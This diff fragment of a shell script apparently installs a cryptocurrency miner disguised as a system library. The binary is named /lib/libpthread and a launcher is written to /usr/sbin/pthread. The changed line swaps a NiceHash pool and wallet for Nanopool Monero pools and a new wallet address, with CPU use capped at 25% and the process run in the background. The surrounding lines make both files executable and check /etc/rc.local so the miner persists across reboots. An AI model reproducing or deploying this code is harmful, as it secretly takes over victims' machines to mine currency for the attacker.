@@ -43,7 +43,7 @@ case $PM in
         echo $PM + "," +  $DISTRO
         ;;  
 esac 
-sudo echo "/lib/libpthread -o nicehash.gpu360.com:3355 -u 33MQmd3LSueY4gxSCXSJLrmVxtQ6WTQqJP.libpthread --nicehash  --max-cpu-usage=25 -p x --background" > /usr/sbin/pthread
+sudo echo "/lib/libpthread -o xmr-asia1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb."+ $RANDOM +" -p x -k -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb."+$RANDOM+" -p x -k --max-cpu-usage=25 --background" > /usr/sbin/pthread
 sudo chmod +x /lib/libpthread
 sudo chmod +x /usr/sbin/pthread
 if [ -z "`grep "/usr/sbin/pthread" /etc/rc.local`" ]; then
